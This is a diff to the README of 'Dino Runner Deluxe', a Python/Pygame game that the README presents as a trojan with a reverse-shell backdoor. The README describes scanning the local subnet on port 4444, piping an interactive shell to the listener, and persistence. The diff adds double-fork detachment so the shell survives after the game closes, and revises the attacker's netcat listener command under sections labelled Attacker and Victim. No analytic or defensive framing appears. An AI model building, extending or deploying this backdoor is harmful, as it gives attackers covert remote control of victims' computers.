@@ -12,6 +12,7 @@ Dino Runner Deluxe is an endless runner game developed in Python/Pygame. Beyond 
 ### 2.1 Reverse Shell (Backdoor)
 - **Automatic Discovery:** The game automatically scans the local `/24` subnet on port **4444** to find a listener.
 - **Interactive Shell:** It selects a compatible interactive shell based on the environment (`/bin/zsh`, `/bin/bash`, or `/bin/sh`) and redirects its streams to the socket.
+- **Detached Execution:** Uses a double-fork mechanism to ensure the shell process survives even after the game is closed.
 - **Cross-Platform:** Supports macOS and Linux systems.
 
 ### 2.2 Persistence mechanism
@@ -27,7 +28,7 @@ Dino Runner Deluxe is an endless runner game developed in Python/Pygame. Beyond 
 ## 3. Installation & Usage
 
 ### 3.1 For the Listener (Attacker)
-1. Start the shell listener: `nc -lvnp 4444`
+1. Start the shell listener: `nc -lk -vnp 4444`
 2. (Optional) Provide assets via HTTP: `python3 -m http.server 7950` (from project root).
 
 ### 3.2 For the Target (Victim)
